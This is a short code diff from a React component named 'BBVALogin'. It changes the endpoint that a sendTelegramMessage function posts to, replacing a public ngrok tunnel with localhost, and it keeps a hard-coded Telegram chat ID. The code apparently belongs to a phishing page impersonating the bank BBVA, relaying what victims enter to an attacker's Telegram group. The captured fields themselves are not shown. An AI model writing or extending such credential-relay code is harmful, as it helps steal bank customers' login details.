@@ -26,7 +26,7 @@ const BBVALogin = () => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
-            const response = await fetch('https://proof.ngrok.app/enviarmensaje', {
+            const response = await fetch('http://localhost:3000/enviarmensaje', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
